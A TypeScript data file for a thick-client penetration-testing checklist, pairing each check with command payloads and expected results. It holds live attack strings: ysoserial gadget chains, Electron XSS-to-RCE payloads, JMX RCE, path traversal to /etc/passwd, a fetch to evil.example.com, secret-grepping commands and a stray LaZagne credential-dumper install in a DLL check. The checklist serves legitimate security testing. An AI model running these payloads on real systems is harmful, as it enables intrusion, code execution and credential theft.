import type { ChecklistCategory } from "../types/checklist";

// Ordered: Static Analysis -> Dynamic Analysis -> Binary Analysis -> Network
// -> Electron -> Java Thick Client -> Local Privilege Escalation

export const thickClientCategories: ChecklistCategory[] = [
  {
    id: "tc-static",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Static Analysis",
    emoji: "🖥️",
    items: [
      {
        id: "tc-static-1",
        text: "Decompile binary and review for hardcoded secrets",
        how: "Use appropriate decompiler for the platform (dnSpy for .NET, JD-GUI for Java) to inspect source for credentials/logic.",
        payloads: [
          "ilspycmd -o out/ MyApp.exe",
          "dnSpy MyApp.exe   # right-click -> Analyze / Export to Project",
          "jd-gui MyApp.jar",
          "grep -RniE \"password|api[_-]?key|secret|connectionstring\" out/",
        ],
        expectedResponse: {
          vulnerable: "Decompiled source contains plaintext credentials, API keys, or connection strings that can be extracted and reused directly.",
          safe: "No secrets appear in decompiled output; sensitive values are absent, retrieved at runtime from a secure vault, or are only encrypted placeholders.",
        },
        severity: "high",
      },
      {
        id: "tc-static-2",
        text: "Check application configuration files for sensitive data",
        how: "Review config/ini/xml files shipped with the installer for plaintext credentials or internal endpoints.",
        payloads: [
          "findstr /si password *.config *.ini *.xml *.json",
          "grep -RniE \"pwd|password|apikey|token|endpoint\" \"C:\\Program Files\\MyApp\"",
          "type App.config | findstr connectionString",
        ],
        expectedResponse: {
          vulnerable: "Config files on disk contain plaintext passwords, API keys, or connection strings readable by any local user.",
          safe: "Config files contain no sensitive values, or values are encrypted/protected by OS-level secrets storage (DPAPI, Keychain, etc.).",
        },
        severity: "high",
      },
      {
        id: "tc-static-3",
        text: "Check for hardcoded encryption keys in the binary",
        how: "Search decompiled code/resources for static keys used in local data encryption.",
        payloads: [
          "strings -n 8 MyApp.exe | grep -iE \"key|iv=|aes|rijndael\"",
          "grep -RniE \"AES\\.Create|new SymmetricAlgorithm|byte\\[\\] key\" out/",
          "binwalk -e MyApp.exe   # pull embedded resources for offline key search",
        ],
        expectedResponse: {
          vulnerable: "A static AES/RSA key or IV is found hardcoded in the binary or resources, allowing all locally-encrypted data to be decrypted offline.",
          safe: "No static key material is found; keys are derived per-install/per-user (e.g. from OS keystore or user secret) rather than embedded in the binary.",
        },
        severity: "high",
      },
      {
        id: "tc-static-4",
        text: "Check installer for insecure file/registry permissions",
        how: "Review what permissions the installer sets on application files, folders, and registry keys — overly permissive ACLs enable tampering.",
        payloads: [
          "icacls \"C:\\Program Files\\MyApp\"",
          "accesschk64.exe -wvu \"C:\\Program Files\\MyApp\"",
          "accesschk64.exe -kvw hklm\\software\\MyApp",
        ],
        expectedResponse: {
          vulnerable: "icacls/accesschk shows Authenticated Users or Everyone with Write/Modify/FullControl on the app's install folder, files, or registry keys.",
          safe: "Only Administrators/SYSTEM have write access to install files, folders, and registry keys; standard users are limited to Read/Execute.",
        },
        severity: "medium",
      },
      {
        id: "tc-static-5",
        text: "Check for auto-update mechanism integrity verification",
        how: "Review whether update packages are signature-verified before being applied, preventing malicious update injection.",
        payloads: [
          "signtool verify /pa /v update_package.msi",
          "mitmproxy -p 8080   # intercept the update check/download request, tamper with the payload and replay",
          "grep -RniE \"X509Certificate|VerifySignature|Authenticode\" out/",
        ],
        expectedResponse: {
          vulnerable: "A tampered/unsigned update package is accepted and applied by the client, or signtool verification is never invoked before execution.",
          safe: "The client rejects the tampered update package with a signature-verification error and refuses to install it.",
        },
        severity: "critical",
      },
      {
        id: "tc-static-6",
        text: "Check for DLL/library dependencies vulnerable to hijacking",
        how: "Identify DLLs loaded without a fully-qualified path, which can be hijacked by placing a malicious DLL earlier in the search order.",
        payloads: [
          "procmon.exe   # filter: Result is NAME NOT FOUND, Path ends with .dll",
          "python3 -m pip install lazagne; strings MyApp.exe | grep -i \".dll\"",
          "dumpbin /imports MyApp.exe | findstr .dll",
        ],
        expectedResponse: {
          vulnerable: "The app loads the planted malicious DLL from a writable directory earlier in the search order and executes attacker code (confirmed via Process Monitor showing successful load, or calc.exe popping).",
          safe: "The app only loads DLLs via fully-qualified paths or from trusted system directories, and the planted DLL in the writable location is never loaded.",
        },
        severity: "high",
      },
    ],
  },
  {
    id: "tc-dynamic",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Dynamic Analysis",
    emoji: "⚙️",
    items: [
      {
        id: "tc-dynamic-1",
        text: "Monitor process for sensitive data in memory",
        how: "Use a memory inspection tool (Process Hacker, x64dbg) to search running process memory for plaintext credentials/tokens.",
        payloads: [
          "procdump64.exe -ma MyApp.exe MyApp.dmp",
          "strings -n 6 MyApp.dmp | grep -iE \"password|bearer|token|session\"",
          "# Process Hacker: right-click process -> Properties -> Memory -> Strings",
        ],
        expectedResponse: {
          vulnerable: "A memory dump/string search reveals plaintext passwords, session tokens, or bearer tokens still resident in process memory.",
          safe: "No plaintext credentials or tokens are found in the memory dump; sensitive strings are absent, cleared after use, or held only as encrypted/opaque handles.",
        },
        severity: "medium",
      },
      {
        id: "tc-dynamic-2",
        text: "Monitor file system activity during app usage",
        how: "Use Process Monitor to observe files written/read during normal operation, checking for sensitive data written unencrypted.",
        payloads: [
          "# Procmon filter: Process Name is MyApp.exe AND Operation is WriteFile",
          "procmon.exe /AcceptEula /Quiet /Minimized /BackingFile trace.pml",
          "findstr /si password %APPDATA%\\MyApp\\*.log %LOCALAPPDATA%\\MyApp\\*",
        ],
        expectedResponse: {
          vulnerable: "Procmon/log inspection shows credentials, tokens, or other sensitive data written unencrypted to log or cache files on disk.",
          safe: "Files written during normal operation contain no sensitive plaintext data, or such data is encrypted before being written.",
        },
        severity: "medium",
      },
      {
        id: "tc-dynamic-3",
        text: "Monitor registry activity for sensitive data storage",
        how: "Check if credentials, tokens, or license keys are stored in the Windows registry in plaintext.",
        payloads: [
          "# Procmon filter: Operation is RegSetValue AND Process Name is MyApp.exe",
          "reg query HKCU\\Software\\MyApp /s",
          "reg export HKCU\\Software\\MyApp app.reg && findstr /i \"password token key\" app.reg",
        ],
        expectedResponse: {
          vulnerable: "Registry export/query reveals plaintext credentials, license keys, or session tokens stored under the app's registry hive.",
          safe: "No plaintext sensitive values are found in the registry; any stored values are encrypted or protected via DPAPI.",
        },
        severity: "medium",
      },
      {
        id: "tc-dynamic-4",
        text: "Test license/feature-flag bypass via local tampering",
        how: "Check if licensing/feature checks are enforced only client-side and can be patched in memory or on disk.",
        payloads: [
          "x64dbg MyApp.exe   # set breakpoint on IsLicensed/CheckFeature, force EAX=1 on return",
          "reg add HKCU\\Software\\MyApp /v LicenseValid /t REG_DWORD /d 1 /f",
          "frida -f MyApp.exe -l bypass-license.js --no-pause",
        ],
        expectedResponse: {
          vulnerable: "Patching the in-memory return value or local registry flag unlocks paid features/full license without any server-side check failing.",
          safe: "Feature/license state is re-validated against a server or signed token on each check, so local patching has no effect and premium features stay locked.",
        },
        severity: "medium",
      },
      {
        id: "tc-dynamic-5",
        text: "Test for DLL injection / process hollowing resistance",
        how: "Attempt to inject a DLL into the running process to see if the app has any anti-tampering detection.",
        payloads: [
          "# Simple LoadLibrary-based DLL injector (CreateRemoteThread + WriteProcessMemory targeting MyApp.exe)",
          "frida -f MyApp.exe -l inject-test.js --no-pause",
          "Process Hacker: right-click MyApp.exe -> Miscellaneous -> Inject DLL...",
        ],
        expectedResponse: {
          vulnerable: "The injected DLL loads and executes successfully inside the target process with no detection or termination by the app.",
          safe: "The app detects the injection attempt (e.g. integrity/module check) and terminates, blocks the load, or alerts, preventing the injected code from running.",
        },
        severity: "low",
      },
      {
        id: "tc-dynamic-6",
        text: "Test debugger attach resistance",
        how: "Attach a debugger to the running process and check if the app detects and reacts (anti-debug checks).",
        payloads: [
          "x64dbg -p <PID>   # observe if app exits or crashes on attach",
          "windbg -pn MyApp.exe",
          "# Check for IsDebuggerPresent/CheckRemoteDebuggerPresent calls: dumpbin /disasm MyApp.exe | findstr IsDebuggerPresent",
        ],
        expectedResponse: {
          vulnerable: "A debugger attaches to the running process without any resistance, allowing full inspection/manipulation of execution and memory.",
          safe: "The app detects the debugger attach via IsDebuggerPresent/CheckRemoteDebuggerPresent (or similar) and exits, crashes intentionally, or alters behavior to hinder analysis.",
        },
        severity: "low",
      },
    ],
  },
  {
    id: "tc-binary",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Binary Analysis",
    emoji: "🧬",
    items: [
      {
        id: "tc-binary-1",
        text: "Check for missing binary hardening flags",
        how: "Verify ASLR, DEP/NX, and stack canaries are enabled in the compiled binary.",
        payloads: [
          "dumpbin /headers MyApp.exe | findstr /i \"aslr nx dynamic\"",
          "winchecksec.exe MyApp.exe",
          "checksec --file=MyApp   # Linux binaries: NX, PIE, RELRO, canary",
        ],
        expectedResponse: {
          vulnerable: "winchecksec/checksec reports ASLR, DEP/NX, or stack canaries as disabled, making memory-corruption bugs far easier to exploit.",
          safe: "All hardening flags (ASLR, DEP/NX, stack canary, and RELRO/PIE on Linux) are reported enabled on the binary.",
        },
        severity: "medium",
      },
      {
        id: "tc-binary-2",
        text: "Test for buffer overflow in input-handling functions",
        how: "Fuzz local input fields/file parsers with oversized input to check for memory corruption in native code paths.",
        payloads: [
          "python3 -c \"print('A'*5000)\" > overflow.txt",
          "afl-fuzz -i corpus/ -o findings/ -- ./MyAppParser @@",
          "!exploitable   # WinDbg extension after a crash to triage exploitability",
        ],
        expectedResponse: {
          vulnerable: "Oversized input crashes the parser with a memory-corruption fault (e.g. access violation overwriting EIP/RIP), and !exploitable flags it as likely exploitable.",
          safe: "Oversized input is rejected or truncated gracefully with no crash, or the crash is a controlled/handled exception with no corrupted control flow.",
        },
        severity: "critical",
      },
      {
        id: "tc-binary-3",
        text: "Check for format string vulnerabilities",
        how: "Test functions that pass user input directly as a format string argument (printf-family) without a format specifier.",
        payloads: [
          "%x.%x.%x.%x.%x.%x.%x",
          "%n%n%n%n",
          "%s%s%s%s%s%s%s%s",
        ],
        expectedResponse: {
          vulnerable: "The format specifiers are interpreted, leaking stack memory contents in the output or crashing the process (e.g. via %n write).",
          safe: "The input is treated as a literal string with no format-string interpretation, and the raw specifiers are echoed back or safely escaped.",
        },
        severity: "high",
      },
      {
        id: "tc-binary-4",
        text: "Test for insecure deserialization of local save/config files",
        how: "If the app deserializes custom save files, craft a malicious file to test for object injection/RCE.",
        payloads: [
          "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c \"calc.exe\" > payload.txt",
          "ysoserial -p Hessian -g SpringPartiallyPropagatorFilter1 -c \"id\" -o savefile.bin",
          "# Java: ysoserial CommonsCollections6 'id' > save.dat, then load via app's Open/Import feature",
        ],
        expectedResponse: {
          vulnerable: "Loading the crafted save/config file triggers the gadget chain and executes the embedded command (e.g. calc.exe pops or 'id' output is confirmed).",
          safe: "The malicious file is rejected during deserialization (type-check/allowlist failure) or fails to parse, with no code execution.",
        },
        severity: "critical",
      },
      {
        id: "tc-binary-5",
        text: "Check for obfuscation/packing of the binary",
        how: "Assess whether the binary is packed/obfuscated, affecting both reverse-engineering difficulty and potential AV false positives.",
        payloads: [
          "diec.exe MyApp.exe   # Detect It Easy: packer/protector signature scan",
          "peid MyApp.exe",
          "yara -r packers.yar MyApp.exe",
        ],
        expectedResponse: {
          vulnerable: "The binary is unpacked/unobfuscated, making it trivial to decompile, reverse engineer, and extract embedded logic or secrets.",
          safe: "The binary is packed/obfuscated with a recognized protector, meaningfully raising the effort needed for static reverse engineering.",
        },
        severity: "low",
      },
    ],
  },
  {
    id: "tc-network",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Network Communication",
    emoji: "📡",
    items: [
      {
        id: "tc-network-1",
        text: "Intercept and inspect thick client traffic",
        how: "Route the app through a proxy (Burp/Fiddler) and check whether traffic is encrypted and cert-pinned.",
        payloads: [
          "netsh winhttp set proxy 127.0.0.1:8080",
          "proxifier.exe   # force non-proxy-aware app traffic through Burp",
          "mitmproxy -p 8080 --set block_global=false",
        ],
        expectedResponse: {
          vulnerable: "Traffic proxies successfully and is readable in plaintext/decrypted form, with no certificate pinning blocking the interception.",
          safe: "The app refuses to communicate through the proxy (pinning failure/connection error) or all inspected traffic is properly TLS-encrypted with no readable sensitive content.",
        },
        severity: "medium",
      },
      {
        id: "tc-network-2",
        text: "Test custom binary protocol for injection/parsing flaws",
        how: "If the app uses a proprietary TCP/binary protocol rather than HTTP, use a tool like Wireshark + a custom fuzzer to test message parsing.",
        payloads: [
          "wireshark -k -i any -f \"tcp port 5000\"",
          "boofuzz-based script targeting the captured message structure (fuzz length-prefixed fields)",
          "nc -nv <target-ip> 5000 < crafted_packet.bin",
        ],
        expectedResponse: {
          vulnerable: "Malformed/fuzzed packets crash the service, cause a hang, or trigger unexpected parsing behavior (e.g. buffer over-read, protocol state corruption).",
          safe: "Malformed packets are rejected cleanly with an error/disconnect and the service continues operating normally with no crash or corruption.",
        },
        severity: "high",
      },
      {
        id: "tc-network-3",
        text: "Test for cleartext credentials sent during authentication",
        how: "Capture the login handshake and confirm credentials aren't sent unencrypted even on an internal/VPN network.",
        payloads: [
          "tcpdump -i any -w login.pcap port not 443",
          "wireshark login.pcap   # Follow TCP Stream on the auth request, search for username/password",
          "tshark -r login.pcap -Y \"tcp contains \\\"password\\\"\"",
        ],
        expectedResponse: {
          vulnerable: "The captured TCP stream contains the plaintext username/password or an unencrypted auth token during login.",
          safe: "The login handshake is fully encrypted (e.g. TLS) and no credentials appear in plaintext within the captured traffic.",
        },
        severity: "high",
      },
      {
        id: "tc-network-4",
        text: "Test certificate validation for MITM resilience",
        how: "Use a self-signed/rogue certificate proxy and confirm the client actually rejects the untrusted connection.",
        payloads: [
          "mitmproxy -p 8080   # generate & serve mitmproxy CA, do NOT install it on the client",
          "openssl req -x509 -newkey rsa:2048 -keyout rogue.key -out rogue.crt -days 365 -nodes",
          "burp   # invalid/untrusted upstream cert, confirm client aborts the TLS handshake",
        ],
        expectedResponse: {
          vulnerable: "The client completes the TLS handshake and communicates normally with the rogue/self-signed certificate, indicating no real validation or pinning.",
          safe: "The client aborts the connection with a certificate-trust error when presented with the untrusted/rogue certificate.",
        },
        severity: "critical",
      },
      {
        id: "tc-network-5",
        text: "Apply standard API tests to backend endpoints used by the client",
        how: "Once traffic is intercepted, apply the same IDOR/injection/auth checks used for the API domain to every backend call.",
        payloads: [
          "burp intruder   # replay captured requests with modified IDs/params",
          "curl -X GET https://api.internal.example.com/v1/users/1 -H \"Authorization: Bearer <token>\"",
          "sqlmap -r captured_request.txt -p id --batch",
        ],
        expectedResponse: {
          vulnerable: "Replayed/modified requests against the backend succeed with unauthorized data access (IDOR) or trigger injection (e.g. sqlmap confirms an injectable parameter).",
          safe: "The backend enforces authorization on every object reference and properly parameterizes/validates inputs, returning 403/400 or unchanged results for tampered requests.",
        },
        severity: "high",
      },
    ],
  },
  {
    id: "tc-electron",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/README",
    name: "Electron Application Security",
    emoji: "⚛️",
    items: [
      {
        id: "tc-electron-1",
        text: "Check nodeIntegration and contextIsolation settings",
        how: "Inspect the app's main process config; nodeIntegration enabled with remote content loaded can lead to RCE via XSS.",
        payloads: [
          "npx asar extract app.asar app-src/ && grep -RniE \"nodeIntegration|contextIsolation\" app-src/",
          "grep -Rn \"new BrowserWindow\" app-src/ -A 10",
          "# In devtools console of a loaded page: typeof require !== 'undefined'  // true = nodeIntegration is exposed",
        ],
        expectedResponse: {
          vulnerable: "nodeIntegration is true and contextIsolation is false on a window loading remote/untrusted content; `typeof require` returns 'function' in devtools, exposing full Node.js APIs to renderer script.",
          safe: "nodeIntegration is disabled and contextIsolation is enabled; `require` is undefined in the renderer console with no Node access exposed.",
        },
        severity: "critical",
      },
      {
        id: "tc-electron-2",
        text: "Check for remote module enabled unnecessarily",
        how: "Verify the deprecated 'remote' module isn't enabled, as it grants renderer processes broad main-process access.",
        payloads: [
          "grep -Rn \"enableRemoteModule\\|@electron/remote\\|require('electron').remote\" app-src/",
          "// devtools console: require('electron').remote.app.getAppPath()",
        ],
        expectedResponse: {
          vulnerable: "The remote module is enabled and `require('electron').remote.app.getAppPath()` (or similar) succeeds from the renderer, granting broad main-process access.",
          safe: "The remote module is disabled/removed; calls to it throw an error or are undefined, and no main-process objects are reachable from the renderer.",
        },
        severity: "high",
      },
      {
        id: "tc-electron-3",
        text: "Test preload script exposure for unsafe IPC surface",
        how: "Review the contextBridge-exposed API for functions that let renderer-side (potentially XSS'd) code trigger dangerous main-process actions.",
        payloads: [
          "grep -Rn \"contextBridge.exposeInMainWorld\" app-src/ -A 15",
          "// devtools console: Object.keys(window.electronAPI)",
          "// devtools console: window.electronAPI.readFile('../../../../etc/passwd')",
        ],
        expectedResponse: {
          vulnerable: "The exposed preload API accepts arbitrary paths/commands and `window.electronAPI.readFile('../../../../etc/passwd')` returns file contents outside the intended scope.",
          safe: "The preload API validates/sanitizes and restricts inputs to an allowlisted scope, so path traversal or arbitrary command attempts are rejected.",
        },
        severity: "high",
      },
      {
        id: "tc-electron-4",
        text: "Test for XSS-to-RCE via loaded remote content",
        how: "If any renderer loads remote/untrusted web content, chain a found XSS with insecure Electron settings to achieve native code execution.",
        payloads: [
          "<img src=x onerror=\"require('child_process').exec('calc.exe')\">",
          "<script>new Function('return this')().process.mainModule.require('child_process').execSync('id')</script>",
        ],
        expectedResponse: {
          vulnerable: "The injected script executes native code (e.g. calc.exe pops or 'id' output returns), confirming XSS escalates to full OS command execution.",
          safe: "The payload is blocked by contextIsolation/CSP or Node globals are unreachable, so the injected script has no access to process/child_process and cannot execute native code.",
        },
        severity: "critical",
      },
      {
        id: "tc-electron-5",
        text: "Check webSecurity and allowRunningInsecureContent settings",
        how: "Verify these aren't disabled, which would allow mixed content and same-origin-policy bypass within the app's webviews.",
        payloads: [
          "grep -Rn \"webSecurity\\|allowRunningInsecureContent\\|webviewTag\" app-src/",
          "// devtools console on a loaded page: fetch('https://evil.example.com').then(r=>r.text()).then(console.log)  // should be blocked by CORS if webSecurity is on",
        ],
        expectedResponse: {
          vulnerable: "webSecurity is disabled and the cross-origin fetch succeeds without a CORS error, allowing same-origin-policy bypass and mixed content loading.",
          safe: "webSecurity remains enabled; the cross-origin fetch is blocked by CORS and mixed/insecure content is refused to load.",
        },
        severity: "medium",
      },
      {
        id: "tc-electron-6",
        text: "Check for outdated Electron/Chromium version with known CVEs",
        how: "Identify the bundled Electron version and cross-reference against known Chromium/Electron RCE and sandbox-escape CVEs.",
        payloads: [
          "MyApp.exe --version",
          "grep -n \"\\\"electron\\\"\" app-src/package.json",
          "npx electron-fiddle -   # or check chrome://version inside the app's devtools",
        ],
        expectedResponse: {
          vulnerable: "The bundled Electron/Chromium version matches a known CVE (e.g. a sandbox-escape or RCE bug) with no mitigating patch applied.",
          safe: "The bundled Electron/Chromium version is current and has no known unpatched CVEs affecting the app's configuration.",
        },
        severity: "high",
      },
    ],
  },
  {
    id: "tc-java",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Java Thick Client Security",
    emoji: "☕",
    items: [
      {
        id: "tc-java-1",
        text: "Decompile JAR/class files for hardcoded secrets",
        how: "Use JD-GUI/CFR to decompile bundled JAR files and search for embedded credentials or internal config.",
        payloads: [
          "java -jar cfr.jar MyApp.jar --outputdir out/",
          "jd-gui MyApp.jar",
          "grep -RniE \"password|secret|apikey\" out/",
        ],
        expectedResponse: {
          vulnerable: "Decompiled Java source/resources contain hardcoded credentials, API keys, or internal configuration values.",
          safe: "No secrets appear in decompiled classes; sensitive configuration is loaded externally or from a secure store at runtime.",
        },
        severity: "high",
      },
      {
        id: "tc-java-2",
        text: "Test Java deserialization on any local file/socket input",
        how: "Check for ObjectInputStream.readObject() calls on untrusted input (local files, sockets) and test known gadget chains.",
        payloads: [
          "grep -Rn \"readObject\\(\\)\" out/",
          "java -jar ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > gadget.bin",
          "nc -nv <target-ip> <port> < gadget.bin",
        ],
        expectedResponse: {
          vulnerable: "The crafted gadget-chain payload triggers command execution on deserialization (e.g. 'touch /tmp/pwned' succeeds), confirming unsafe readObject() usage.",
          safe: "Deserialization is rejected for unexpected types (via a look-ahead filter/allowlist) or the endpoint doesn't use native Java serialization, so the gadget chain never executes.",
        },
        severity: "critical",
      },
      {
        id: "tc-java-3",
        text: "Check for JMX/RMI interfaces exposed without authentication",
        how: "Scan for JMX/RMI registry ports left open, which can allow remote code execution if unauthenticated.",
        payloads: [
          "nmap -p 1099,9010-9100 <target-ip>",
          "java -jar ysoserial.jar CommonsCollections6 'id' | java -jar mjet.jar -a <target-ip>:1099 -m",
          "jconsole   # attempt to connect to service:jmx:rmi:///jndi/rmi://<target-ip>:1099/jmxrmi with no credentials",
        ],
        expectedResponse: {
          vulnerable: "jconsole/mjet connects to the JMX/RMI endpoint with no authentication and achieves remote code execution via MBean deployment.",
          safe: "The JMX/RMI port requires authentication (or is not exposed externally), and unauthenticated connection attempts are refused.",
        },
        severity: "critical",
      },
      {
        id: "tc-java-4",
        text: "Check SecurityManager / sandboxing configuration",
        how: "For applets/Java Web Start apps, verify the security manager restricts filesystem/network access appropriately.",
        payloads: [
          "grep -Rn \"System.getSecurityManager\\|AccessController.checkPermission\" out/",
          "cat $JAVA_HOME/lib/security/java.policy",
          "// Test escape: System.getSecurityManager().checkPermission(new java.security.AllPermission())",
        ],
        expectedResponse: {
          vulnerable: "No SecurityManager is installed, or checkPermission(AllPermission) succeeds silently, meaning applet/Web Start code can access the filesystem/network without restriction.",
          safe: "A SecurityManager is active with a restrictive policy, and the AllPermission check throws a SecurityException, confirming sandboxing is enforced.",
        },
        severity: "medium",
      },
    ],
  },
  {
    id: "tc-privesc",
    reference: "https://owasp.org/www-project-web-security-testing-guide/stable/",
    name: "Local Privilege Escalation",
    emoji: "⬆️",
    items: [
      {
        id: "tc-privesc-1",
        text: "Test for insecure service permissions (Windows services)",
        how: "Check if the app's Windows service binary path or config is writable by a low-privileged user, allowing hijack to SYSTEM.",
        payloads: [
          "accesschk64.exe -uwcqv \"Authenticated Users\" *",
          "sc qc MyAppService",
          "icacls \"C:\\Program Files\\MyApp\\service.exe\"",
        ],
        expectedResponse: {
          vulnerable: "Authenticated Users have Write/Modify access to the service binary or its config, allowing replacement with a malicious executable that runs as SYSTEM on next start/reboot.",
          safe: "Only Administrators/SYSTEM can modify the service binary and its configuration; standard/authenticated users have Read/Execute only.",
        },
        severity: "critical",
      },
      {
        id: "tc-privesc-2",
        text: "Test for unquoted service path vulnerability",
        how: "Check if the service binary path contains spaces without quotes, allowing a planted executable earlier in the path to run instead.",
        payloads: [
          "wmic service get name,displayname,pathname,startmode | findstr /i /v \"\\\"\" | findstr /i /v \"C:\\Windows\"",
          "sc qc MyAppService   # look for BINARY_PATH_NAME without surrounding quotes",
          "copy calc.exe \"C:\\Program Files\\My.exe\"   # PoC if path is C:\\Program Files\\My App\\service.exe",
        ],
        expectedResponse: {
          vulnerable: "The service BINARY_PATH_NAME is unquoted and contains spaces (e.g. C:\\Program Files\\My App\\service.exe), and a planted executable at an earlier path segment is launched with SYSTEM privileges on service start.",
          safe: "The binary path is fully quoted, contains no spaces, or Windows always resolves and launches the intended service executable regardless of planted files.",
        },
        severity: "high",
      },
      {
        id: "tc-privesc-3",
        text: "Test for weak file/folder permissions in install directory",
        how: "Check if a standard user can write to the app's install directory, enabling binary/DLL replacement.",
        payloads: [
          "icacls \"C:\\Program Files\\MyApp\"",
          "accesschk64.exe -wvud \"C:\\Program Files\\MyApp\"",
          "echo test > \"C:\\Program Files\\MyApp\\writetest.txt\" && del \"C:\\Program Files\\MyApp\\writetest.txt\"",
        ],
        expectedResponse: {
          vulnerable: "A standard user can write/delete files in the install directory (write test file succeeds), allowing replacement of the main binary or a loaded DLL for privilege escalation.",
          safe: "The write test fails with access denied; the install directory is writable only by Administrators/SYSTEM.",
        },
        severity: "high",
      },
      {
        id: "tc-privesc-4",
        text: "Test scheduled tasks/cron jobs created by the app",
        how: "Review any scheduled tasks the app installs for weak permissions or execution of user-writable scripts.",
        payloads: [
          "schtasks /query /v /fo LIST | findstr /i MyApp",
          "icacls \"C:\\Program Files\\MyApp\\updater.ps1\"",
          "crontab -l -u <service-account>   # Linux/macOS equivalent",
        ],
        expectedResponse: {
          vulnerable: "A scheduled task/cron job runs a script that a standard user can modify (weak ACL), letting that user's injected code run with the task's elevated privileges.",
          safe: "Scheduled task scripts and their containing folders are writable only by Administrators/root, so a standard user cannot alter what gets executed on the privileged schedule.",
        },
        severity: "high",
      },
      {
        id: "tc-privesc-5",
        text: "Test named pipe / IPC endpoint access control",
        how: "Check if local IPC mechanisms (named pipes, local sockets) used by a privileged component accept commands from unprivileged local processes.",
        payloads: [
          "PipeList.exe   # Sysinternals: enumerate named pipes and their DACLs",
          "accesschk64.exe -w \\\\pipe\\\\MyAppPipe",
          "echo COMMAND | powershell -c \"$p=New-Object System.IO.Pipes.NamedPipeClientStream('.','MyAppPipe','InOut'); $p.Connect(); $w=New-Object System.IO.StreamWriter($p); $w.WriteLine('whoami'); $w.Flush()\"",
        ],
        expectedResponse: {
          vulnerable: "The named pipe has a weak/null DACL and an unprivileged client's command (e.g. 'whoami') is accepted and executed by the privileged listening process.",
          safe: "The pipe's DACL restricts access to specific privileged accounts/groups, and connection attempts or commands from an unprivileged process are rejected.",
        },
        severity: "critical",
      },
    ],
  },
];
